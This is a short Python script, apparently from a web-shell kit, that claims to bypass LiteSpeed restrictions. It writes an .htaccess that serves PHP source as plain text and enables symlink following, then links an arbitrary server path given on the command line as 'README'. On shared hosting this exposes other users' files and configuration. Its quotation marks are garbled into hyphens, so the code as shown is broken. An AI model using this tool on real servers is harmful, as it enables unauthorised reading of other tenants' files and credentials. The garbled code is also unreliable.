import os
import sys
if os.path.exists("LiteBypass"):
    os.chdir("LiteBypass")
    os.system("rm -rf README")
    os.system("ln -s - + sys.argv[1] + - README")
else:
    os.mkdir("LiteBypass")
    os.chdir("LiteBypass")
    htaccess = open(-.htaccess","w+-)
    htaccess.write("OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI\nOptions Indexes FollowSymLinks\nForceType text/plain\nAddType text/plain .php\nAddType text/plain .html\nAddType text/html .shtml\nAddType txt .php\nAddHandler server-parsed .php\nAddHandler txt .php\nAddHandler txt .html\nAddHandler txt .shtml\nOptions All")
    htaccess.close()
    os.system("ln -s - + sys.argv[1] + - README")
print(-[+] LiteSpeed Successfully Bypassed")
print(-[+] Bypass ==> - + sys.argv[1])
print(-[+] Bu klasore gidin ==> LiteBypass")